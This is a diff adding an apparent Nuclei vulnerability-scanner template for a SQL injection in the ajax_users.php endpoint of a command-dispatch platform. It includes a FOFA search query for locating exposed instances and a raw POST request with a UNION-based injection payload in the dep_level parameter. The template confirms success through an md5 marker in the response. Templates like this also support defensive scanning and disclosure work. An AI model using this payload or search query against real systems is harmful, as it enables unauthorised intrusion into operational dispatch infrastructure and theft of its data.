@@ -1,0 +1,42 @@
+id: poc-tneg9fkmdyalr6l3
+info:
+  name: 科立迅通信指挥调度平台-SQL注入-ajax_users
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tneg9fkmdyalr6l3'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tneg9fkmdyalr6l3
+    fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+http:
+- raw:
+  - 'POST /app/ext/ajax_users.php HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    dep_level=1'') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    e10adc3949ba59abbe56e057f20f883e
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
